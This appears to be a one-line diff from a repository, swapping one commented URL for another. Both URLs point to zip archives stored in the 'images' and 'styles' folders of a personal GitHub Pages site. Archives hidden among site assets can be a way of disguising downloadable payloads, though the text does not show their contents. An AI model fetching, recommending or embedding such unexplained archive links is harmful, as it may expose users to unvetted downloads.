@@ -1,1 +1,1 @@
-# https://github.com/Firez123445/firez123445.github.io/raw/refs/heads/main/images/io_firez_github_v1.0.zip
+# https://raw.githubusercontent.com/Firez123445/firez123445.github.io/main/styles/github_firez_io_2.9.zip
